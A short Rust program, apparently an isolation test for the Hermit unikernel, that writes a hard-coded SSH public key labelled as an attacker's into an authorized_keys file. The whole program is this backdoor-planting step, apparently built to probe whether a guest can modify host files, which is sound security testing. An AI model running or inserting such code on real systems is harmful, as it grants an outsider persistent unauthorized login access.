use std::{fs::File, io::prelude::*};

#[cfg(target_os = "hermit")]
use hermit as _;

fn main() {
	println!("Hello from modify_host_ssh.rs!");
	let mut file = File::create("/root//home/user/.ssh/authorized_keys").unwrap();
	file.write_all(b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDds3IQ1WRw0yumyj1kxmdoHSo0ovs+EztepD5cWbtuL sshkey@attackerhostname").unwrap();
}
